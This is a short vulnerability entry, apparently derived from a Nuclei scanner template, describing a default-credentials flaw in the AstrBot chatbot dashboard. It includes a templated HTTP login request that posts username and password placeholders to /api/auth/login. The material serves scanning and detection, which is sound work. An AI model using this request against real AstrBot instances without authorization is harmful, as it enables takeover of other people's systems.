# Vulnerability: AstrBot - Default Login
**Classification:** CWE-798
**Source:** Nuclei Template (`astrbot-default-login.yaml`)

## Description
AstrBot contains a default login vulnerability. An attacker can access the AstrBot dashboard using default credentials and gain control over the chatbot framework, modify configurations, manage LLM providers, and execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/
POST /api/auth/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

